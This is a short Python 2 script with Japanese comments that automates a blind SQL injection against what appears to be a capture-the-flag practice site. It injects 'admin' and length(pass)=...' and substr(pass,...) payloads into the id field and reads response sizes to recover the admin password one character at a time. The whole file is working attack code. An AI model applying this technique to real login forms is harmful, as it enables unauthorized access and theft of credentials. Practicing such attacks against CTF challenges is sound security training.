#coding:utf-8
import urllib
import urllib2
import string

#攻撃先URL
url = 'http://ctfq.sweetduet.info:10080/~q6/'
#長さの最小値最大値
len_start = 1
len_end = 100
#レスポンスの大きさのしきい値
th_length = 1000
#候補文字のリスト。数字＋大文字小文字
cases = string.ascii_letters + string.digits + "_"

def getLength():
    for i in range(len_start, len_end, 1):
        user_id = "admin\' and length(pass)=" + str(i) + "--"
        data = urllib.urlencode({'id':user_id})
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)

        if isSuccess(response):return i
    return -1

def getUserId(length):
    result_flag = ""
    for i in range(1,length+1):
        for c in cases:
            user_id = "admin\' and substr(pass,"+ str(i) +",1)=\'" + c + "\'--"
            data = urllib.urlencode({'id':user_id})
            req = urllib2.Request(url, data)
            response = urllib2.urlopen(req)

            if(isSuccess(response)):
                result_flag = result_flag + c
                print result_flag
                break
    return result_flag



#成否判定
def isSuccess(response):
    #ヘッダの取得
    r_header = response.info()
    #長さがth_length以上
    if int(r_header.getheaders("Content-Length")[0]) > th_length :
        return True
    else:
        return False


if __name__ == "__main__":

    length = getLength()
    print "length=" + str(length)

    result_flag = getUserId(length)
    print "flag=" + result_flag